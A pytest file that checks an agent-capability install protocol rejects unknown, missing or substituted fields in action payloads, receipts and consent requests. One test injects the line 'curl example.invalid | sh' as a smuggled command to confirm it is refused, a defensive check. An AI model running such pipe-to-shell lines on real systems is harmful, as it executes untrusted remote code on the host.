"""Strict protocol-v3 payload contracts on the frozen protocol-v1 envelope."""

from __future__ import annotations

import pytest

from ctx.engine.content import AuthorizedMaterial, MaterialDescriptor, MaterialIdentity
from ctx.engine.installation import InstallPlanDescriptor
from ctx.engine.lineage import CatalogCapabilityIdentity, InstalledMaterialLineage
from ctx.engine.protocol import (
    INSTALL_ACTION_PAYLOAD_SCHEMA_V3,
    INSTALL_CONSENT_REQUEST_SCHEMA_V3,
    INSTALL_RECEIPT_SCHEMA_V3,
    MATERIAL_ACTION_PAYLOAD_SCHEMA_V3,
    MATERIAL_RECEIPT_SCHEMA_V3,
    EngineEvent,
    HostAction,
    PrivacyLabel,
    ProtocolValidationError,
    ScopeRef,
)


def _digest(character: str) -> str:
    return character * 64


def _scope() -> ScopeRef:
    return ScopeRef(
        tenant_id="tenant-a",
        workspace_id="workspace-a",
        repository_id="repo-a",
        session_id="session-a",
        exposure_id="parent-agent",
        host_context_id="codex-thread-a",
    )


def _catalog_identity() -> CatalogCapabilityIdentity:
    return CatalogCapabilityIdentity.create(
        capability_id="skill:python-debugger",
        kind="skill",
        catalog_namespace_digest=_digest("1"),
    )


def _material_identity() -> MaterialIdentity:
    return MaterialIdentity.create(
        capability_id="skill:python-debugger",
        kind="skill",
        content_sha256=_digest("2"),
        content_bytes=120,
    )


def _install_descriptor() -> InstallPlanDescriptor:
    return InstallPlanDescriptor.create(
        capability_id="skill:python-debugger",
        kind="skill",
        installer_id="ctx-install-actuator-v1",
        plan_digest=_digest("4"),
        provenance_digest=_digest("9"),
        result_material_identity_digest=_material_identity().identity_digest,
    )


def _install_payload(*, schema: str = INSTALL_ACTION_PAYLOAD_SCHEMA_V3) -> dict[str, object]:
    return {
        "schema": schema,
        "capability_kind": "skill",
        "catalog_identity": _catalog_identity().to_dict(),
        "result_material": _material_identity().to_dict(),
        "install_plan_descriptor": _install_descriptor().to_dict(),
        "installer_digest": _digest("5"),
        "policy_snapshot_digest": _digest("6"),
    }


def _v3_verification(*, state: str, receipt_schema: str) -> dict[str, object]:
    return {
        "receipt_required": True,
        "expected_state": state,
        "receipt_schema": receipt_schema,
    }


def _install_action(**overrides: object) -> HostAction:
    values: dict[str, object] = {
        "action_id": "install-1",
        "kind": "InstallCapability",
        "scope": _scope(),
        "precondition_revision": 6,
        "entity_id": "skill:python-debugger",
        "source_digest": _digest("7"),
        "plan_id": "plan-1",
        "catalog_snapshot_id": _digest("8"),
        "consent_id": "consent-1",
        "required_host_feature": "installation",
        "payload": _install_payload(),
        "verification": _v3_verification(
            state="installed",
            receipt_schema=INSTALL_RECEIPT_SCHEMA_V3,
        ),
        "rollback": {
            "kind": "UninstallCapability",
            "installer_id": "ctx-install-actuator-v1",
        },
        "privacy": PrivacyLabel(classification="private", retention="session"),
    }
    values.update(overrides)
    return HostAction(**values)  # type: ignore[arg-type]


def _authorized_material(*, origin: str = "catalog") -> AuthorizedMaterial:
    catalog_identity = _catalog_identity()
    material_identity = _material_identity()
    if origin == "catalog":
        descriptor = MaterialDescriptor.create(
            capability_id=material_identity.capability_id,
            kind=material_identity.kind,
            actionability="load",
            content_sha256=material_identity.content_sha256,
            content_bytes=material_identity.content_bytes,
            estimated_tokens=30,
            provenance_digest=_digest("a"),
            material_identity_digest=material_identity.identity_digest,
        )
        return AuthorizedMaterial.from_catalog(
            catalog_identity_digest=catalog_identity.identity_digest,
            descriptor=descriptor,
        )
    lineage = InstalledMaterialLineage.create(
        capability_id=material_identity.capability_id,
        kind=material_identity.kind,
        catalog_identity_digest=catalog_identity.identity_digest,
        material_identity_digest=material_identity.identity_digest,
        origin_install_descriptor_digest=_install_descriptor().descriptor_digest,
        install_action_content_digest=_digest("b"),
        install_receipt_content_digest=_digest("c"),
    )
    return AuthorizedMaterial.from_installed(lineage)


def _material_payload(*, origin: str = "catalog") -> dict[str, object]:
    return {
        "schema": MATERIAL_ACTION_PAYLOAD_SCHEMA_V3,
        "capability_kind": "skill",
        "catalog_identity": _catalog_identity().to_dict(),
        "material_identity": _material_identity().to_dict(),
        "authorized_material": _authorized_material(origin=origin).to_dict(),
    }


def _material_action(kind: str = "ActivateCapability", **overrides: object) -> HostAction:
    expected_state = {
        "ActivateCapability": "active",
        "PrepareExposure": "prepared",
        "DeactivateCapability": "inactive",
    }[kind]
    rollback = {
        "ActivateCapability": {"kind": "DeactivateCapability"},
        "PrepareExposure": {
            "kind": "cleanup-prepared-exposure",
            "exposure_id": _scope().exposure_id,
        },
        "DeactivateCapability": {
            "kind": "ActivateCapability",
            "source_digest": _digest("7"),
        },
    }[kind]
    values: dict[str, object] = {
        "action_id": "material-1",
        "kind": kind,
        "scope": _scope(),
        "precondition_revision": 6,
        "entity_id": "skill:python-debugger",
        "source_digest": _digest("7"),
        "plan_id": "plan-1",
        "catalog_snapshot_id": _digest("8"),
        "lease_id": "lease-1",
        "expires_at": "2026-08-02T12:00:00Z",
        "required_host_feature": "activation",
        "payload": _material_payload(),
        "verification": _v3_verification(
            state=expected_state,
            receipt_schema=MATERIAL_RECEIPT_SCHEMA_V3,
        ),
        "rollback": rollback,
    }
    values.update(overrides)
    return HostAction(**values)  # type: ignore[arg-type]


def _receipt(payload: dict[str, object]) -> EngineEvent:
    return EngineEvent(
        event_id="receipt-1",
        kind="ActionApplied",
        scope=_scope(),
        expected_revision=6,
        occurred_at="2026-08-02T12:00:00Z",
        payload=payload,
    )


def _install_consent_expired_payload() -> dict[str, object]:
    return {
        "consent_id": "consent-1",
        "policy_snapshot_digest": _digest("6"),
        "requested_action_id": "install-1",
        "requested_action_kind": "InstallCapability",
        "requested_action_content_digest": _digest("a"),
        "requested_action_precondition_revision": 6,
        "install_expires_at": "2026-08-01T13:00:00Z",
    }


def test_install_consent_expired_round_trips_without_decision_semantics() -> None:
    event = EngineEvent(
        event_id="expiry-1",
        kind="InstallConsentExpired",
        scope=_scope(),
        expected_revision=5,
        occurred_at="2026-08-01T12:00:00Z",
        payload=_install_consent_expired_payload(),
    )

    assert EngineEvent.from_json(event.to_json()) == event
    assert "decision" not in event.payload


@pytest.mark.parametrize("extra_field", ["decision", "decision_basis", "reason"])
def test_install_consent_expired_rejects_human_or_unbound_semantics(extra_field: str) -> None:
    payload = _install_consent_expired_payload()
    payload[extra_field] = "denied"

    with pytest.raises(ProtocolValidationError, match="unknown field"):
        EngineEvent(
            event_id="expiry-invalid",
            kind="InstallConsentExpired",
            scope=_scope(),
            expected_revision=5,
            occurred_at="2026-08-01T12:00:00Z",
            payload=payload,
        )


def _receipt_identity(action: HostAction) -> dict[str, object]:
    return {
        "action_id": action.action_id,
        "action_kind": action.kind,
        "action_content_digest": action.content_digest,
        "action_precondition_revision": action.precondition_revision,
    }


def test_v3_install_action_round_trips_with_exact_material_and_authority_identity() -> None:
    action = _install_action()

    assert HostAction.from_json(action.to_json()) == action
    assert set(action.payload) == {
        "schema",
        "capability_kind",
        "catalog_identity",
        "result_material",
        "install_plan_descriptor",
        "installer_digest",
        "policy_snapshot_digest",
    }
    assert action.payload["catalog_identity"] == _catalog_identity().to_dict()
    assert action.payload["result_material"] == _material_identity().to_dict()
    assert action.payload["install_plan_descriptor"] == _install_descriptor().to_dict()


@pytest.mark.parametrize(
    ("field_name", "invalid_value"),
    [
        ("capability_kind", "unknown-kind"),
        ("catalog_identity", {"schema": "invalid"}),
        ("result_material", {"schema": "invalid"}),
        ("install_plan_descriptor", {"schema": "invalid"}),
        ("installer_digest", "not-valid"),
        ("policy_snapshot_digest", "not-valid"),
    ],
)
def test_v3_install_action_rejects_missing_or_invalid_authority(
    field_name: str,
    invalid_value: object,
) -> None:
    values = _install_action().to_dict()
    values["payload"].pop(field_name)
    with pytest.raises(ProtocolValidationError, match=field_name):
        HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["payload"][field_name] = invalid_value
    with pytest.raises(ProtocolValidationError, match=field_name):
        HostAction.from_dict(values)


def test_v3_install_action_rejects_unknown_fields_and_capability_substitution() -> None:
    values = _install_action().to_dict()
    values["payload"]["command"] = "curl example.invalid | sh"
    with pytest.raises(ProtocolValidationError, match="unknown field.*command"):
        HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["entity_id"] = "skill:other"
    with pytest.raises(ProtocolValidationError, match="entity_id.*typed capability"):
        HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["rollback"]["command"] = "execute arbitrary rollback"
    with pytest.raises(ProtocolValidationError, match="unknown field.*command"):
        HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["payload"]["capability_kind"] = "agent"
    with pytest.raises(ProtocolValidationError, match="capability_kind"):
        HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["payload"]["install_plan_descriptor"]["command"] = "arbitrary execution"
    with pytest.raises(ProtocolValidationError, match="unknown field.*command"):
        HostAction.from_dict(values)


def test_v3_install_action_requires_v2_descriptor_bound_to_full_result_material() -> None:
    legacy_descriptor = InstallPlanDescriptor.create(
        capability_id="skill:python-debugger",
        kind="skill",
        installer_id="ctx-install-actuator-v1",
        plan_digest=_digest("4"),
        provenance_digest=_digest("9"),
    )
    values = _install_action().to_dict()
    values["payload"]["install_plan_descriptor"] = legacy_descriptor.to_dict()
    with pytest.raises(ProtocolValidationError, match="exact v2 descriptor"):
        HostAction.from_dict(values)

    substituted_material = MaterialIdentity.create(
        capability_id="skill:python-debugger",
        kind="skill",
        content_sha256=_digest("d"),
        content_bytes=121,
    )
    values = _install_action().to_dict()
    values["payload"]["result_material"] = substituted_material.to_dict()
    with pytest.raises(ProtocolValidationError, match="exact result_material"):
        HostAction.from_dict(values)


def test_v3_install_action_requires_exact_receipt_contract() -> None:
    for field_name in ("receipt_required", "expected_state", "receipt_schema"):
        values = _install_action().to_dict()
        values["verification"].pop(field_name)
        with pytest.raises(ProtocolValidationError, match=field_name):
            HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["verification"]["expected_state"] = "active"
    with pytest.raises(ProtocolValidationError, match="expected_state"):
        HostAction.from_dict(values)

    values = _install_action().to_dict()
    values["verification"]["detail"] = "free form"
    with pytest.raises(ProtocolValidationError, match="unknown field.*detail"):
        HostAction.from_dict(values)


def test_v3_consent_request_binds_the_exact_precomputed_install() -> None:
    install = _install_action()
    payload = {
        **_install_payload(schema=INSTALL_CONSENT_REQUEST_SCHEMA_V3),
        "requested_action_id": install.action_id,
        "requested_action_kind": install.kind,
        "requested_action_content_digest": install.content_digest,
        "requested_action_precondition_revision": install.precondition_revision,
    }
    request = HostAction(
        action_id="request-1",
        kind="RequestConsent",
        scope=_scope(),
        precondition_revision=5,
        entity_id=install.entity_id,
        source_digest=install.source_digest,
        plan_id=install.plan_id,
        catalog_snapshot_id=install.catalog_snapshot_id,
        consent_id=install.consent_id,
        required_host_feature="installation-consent",
        payload=payload,
    )

    assert HostAction.from_json(request.to_json()) == request
    values = request.to_dict()
    values["payload"]["surprise"] = True
    with pytest.raises(ProtocolValidationError, match="unknown field.*surprise"):
        HostAction.from_dict(values)

    values = request.to_dict()
    values["payload"]["requested_action_kind"] = "UninstallCapability"
    with pytest.raises(ProtocolValidationError, match="must be InstallCapability"):
        HostAction.from_dict(values)


@pytest.mark.parametrize(
    ("kind", "expected_state"),
    [
        ("ActivateCapability", "active"),
        ("PrepareExposure", "prepared"),
        ("DeactivateCapability", "inactive"),
    ],
)
@pytest.mark.parametrize("origin", ["catalog", "installed"])
def test_v3_material_actions_round_trip_with_exact_origin_proof(
    kind: str,
    expected_state: str,
    origin: str,
) -> None:
    action = _material_action(kind, payload=_material_payload(origin=origin))

    assert HostAction.from_json(action.to_json()) == action
    assert action.verification["expected_state"] == expected_state


def test_v3_material_action_rejects_unknown_origin_wrong_state_and_free_form_payload() -> None:
    values = _material_action().to_dict()
    values["payload"]["authorized_material"]["origin"] = "download"
    with pytest.raises(ProtocolValidationError, match="authorized_material"):
        HostAction.from_dict(values)

    values = _material_action().to_dict()
    values["verification"]["expected_state"] = "prepared"
    with pytest.raises(ProtocolValidationError, match="expected_state"):
        HostAction.from_dict(values)

    values = _material_action().to_dict()
    values["payload"]["instructions"] = "load arbitrary content"
    with pytest.raises(ProtocolValidationError, match="unknown field.*instructions"):
        HostAction.from_dict(values)

    values = _material_action().to_dict()
    values["payload"]["material_identity"]["content_bytes"] = 121
    with pytest.raises(ProtocolValidationError, match="material_identity"):
        HostAction.from_dict(values)

    values = _material_action().to_dict()
    values["entity_id"] = "skill:other"
    with pytest.raises(ProtocolValidationError, match="entity_id.*typed capability"):
        HostAction.from_dict(values)

    values = _material_action().to_dict()
    values["rollback"]["command"] = "execute arbitrary rollback"
    with pytest.raises(ProtocolValidationError, match="unknown field.*command"):
        HostAction.from_dict(values)


def test_v3_install_receipt_echoes_exact_observed_material_identity() -> None:
    action = _install_action()
    receipt = _receipt(
        {
            **_receipt_identity(action),
            "verification": {
                "schema": INSTALL_RECEIPT_SCHEMA_V3,
                "host_state": "installed",
                "capability_id": action.entity_id,
                "capability_kind": "skill",
                "catalog_identity": _catalog_identity().to_dict(),
                "material_identity": _material_identity().to_dict(),
                "install_plan_descriptor": _install_descriptor().to_dict(),
                "installer_digest": _digest("5"),
                "policy_snapshot_digest": _digest("6"),
            },
        }
    )

    assert EngineEvent.from_json(receipt.to_json()) == receipt


def test_v3_material_receipt_echoes_exact_origin_proof() -> None:
    action = _material_action("PrepareExposure")
    receipt = _receipt(
        {
            **_receipt_identity(action),
            "verification": {
                "schema": MATERIAL_RECEIPT_SCHEMA_V3,
                "host_state": "prepared",
                "capability_id": action.entity_id,
                "capability_kind": "skill",
                "catalog_identity": _catalog_identity().to_dict(),
                "material_identity": _material_identity().to_dict(),
                "authorized_material": _authorized_material().to_dict(),
            },
        }
    )

    assert EngineEvent.from_json(receipt.to_json()) == receipt

    values = receipt.to_dict()
    values["payload"]["verification"]["capability_id"] = "skill:other"
    with pytest.raises(ProtocolValidationError, match="capability_id.*typed identities"):
        EngineEvent.from_dict(values)


@pytest.mark.parametrize(
    ("schema", "action_kind"),
    [
        (INSTALL_RECEIPT_SCHEMA_V3, "ActivateCapability"),
        (MATERIAL_RECEIPT_SCHEMA_V3, "InstallCapability"),
    ],
)
def test_v3_receipt_schema_cannot_be_substituted_across_action_kinds(
    schema: str,
    action_kind: str,
) -> None:
    verification: dict[str, object] = {
        "schema": schema,
        "host_state": "installed" if schema == INSTALL_RECEIPT_SCHEMA_V3 else "active",
        "capability_id": "skill:python-debugger",
        "capability_kind": "skill",
        "catalog_identity": _catalog_identity().to_dict(),
        "material_identity": _material_identity().to_dict(),
    }
    if schema == INSTALL_RECEIPT_SCHEMA_V3:
        verification["install_plan_descriptor"] = _install_descriptor().to_dict()
        verification["installer_digest"] = _digest("5")
        verification["policy_snapshot_digest"] = _digest("6")
    else:
        verification["authorized_material"] = _authorized_material().to_dict()

    with pytest.raises(ProtocolValidationError, match="schema.*action_kind"):
        _receipt(
            {
                "action_id": "action-1",
                "action_kind": action_kind,
                "action_content_digest": _digest("4"),
                "action_precondition_revision": 6,
                "verification": verification,
            }
        )


def test_v3_receipts_reject_missing_unknown_or_invalid_echoes() -> None:
    action = _install_action()
    payload = {
        **_receipt_identity(action),
        "verification": {
            "schema": INSTALL_RECEIPT_SCHEMA_V3,
            "host_state": "installed",
            "capability_id": action.entity_id,
            "capability_kind": "skill",
            "catalog_identity": _catalog_identity().to_dict(),
            "material_identity": _material_identity().to_dict(),
            "install_plan_descriptor": _install_descriptor().to_dict(),
            "installer_digest": _digest("5"),
            "policy_snapshot_digest": _digest("6"),
        },
    }
    verification = payload["verification"]
    assert isinstance(verification, dict)
    for field_name in (
        "capability_id",
        "capability_kind",
        "catalog_identity",
        "material_identity",
        "install_plan_descriptor",
        "installer_digest",
        "policy_snapshot_digest",
    ):
        invalid_verification = dict(verification)
        invalid_verification.pop(field_name)
        invalid = {**payload, "verification": invalid_verification}
        with pytest.raises(ProtocolValidationError, match=field_name):
            _receipt(invalid)

    invalid_verification = {**verification, "raw_content": "SECRET-SENTINEL"}
    invalid = {**payload, "verification": invalid_verification}
    with pytest.raises(ProtocolValidationError, match="unknown field.*raw_content"):
        _receipt(invalid)

    invalid_verification = {**verification, "capability_kind": "agent"}
    invalid = {**payload, "verification": invalid_verification}
    with pytest.raises(ProtocolValidationError, match="capability_kind.*capability_id"):
        _receipt(invalid)


def test_legacy_install_action_canonical_bytes_and_digest_remain_frozen() -> None:
    action = HostAction(
        action_id="legacy-install-1",
        kind="InstallCapability",
        scope=_scope(),
        precondition_revision=5,
        entity_id="skill:python-debugger",
        source_digest="sha256:source",
        plan_id="plan-0001",
        catalog_snapshot_id="catalog-0001",
        consent_id="consent-0001",
        required_host_feature="installation",
        payload={
            "install_plan_digest": _digest("a"),
            "install_descriptor_digest": _digest("d"),
            "installer_id": "ctx-install-actuator-v1",
            "installer_digest": _digest("b"),
            "policy_snapshot_digest": _digest("c"),
        },
        verification={"expected_state": "installed", "receipt_required": True},
        rollback={
            "kind": "UninstallCapability",
            "installer_id": "ctx-install-actuator-v1",
        },
        privacy=PrivacyLabel(classification="private", retention="session"),
    )
    expected = (
        '{"action_id":"legacy-install-1","catalog_snapshot_id":"catalog-0001",'
        '"consent_id":"consent-0001","entity_id":"skill:python-debugger",'
        '"expires_at":null,"kind":"InstallCapability","lease_id":null,"payload":'
        '{"install_descriptor_digest":"dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",'
        '"install_plan_digest":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",'
        '"installer_digest":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",'
        '"installer_id":"ctx-install-actuator-v1","policy_snapshot_digest":'
        '"cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"},'
        '"plan_id":"plan-0001","precondition_revision":5,"privacy":'
        '{"classification":"private","retention":"session"},"protocol_version":1,'
        '"required_host_feature":"installation","rollback":'
        '{"installer_id":"ctx-install-actuator-v1","kind":"UninstallCapability"},'
        '"scope":{"exposure_id":"parent-agent","host_context_id":"codex-thread-a",'
        '"parent_exposure_id":null,"repository_id":"repo-a","session_id":"session-a",'
        '"tenant_id":"tenant-a","workspace_id":"workspace-a"},'
        '"source_digest":"sha256:source","verification":'
        '{"expected_state":"installed","receipt_required":true}}'
    )

    assert action.to_json() == expected
    assert (
        action.content_digest == "a662cc9d041549b7517bc7bc40edd97d63f1dacb985d71ca488d7ff5ed88e8e6"
    )
    assert HostAction.from_json(expected) == action
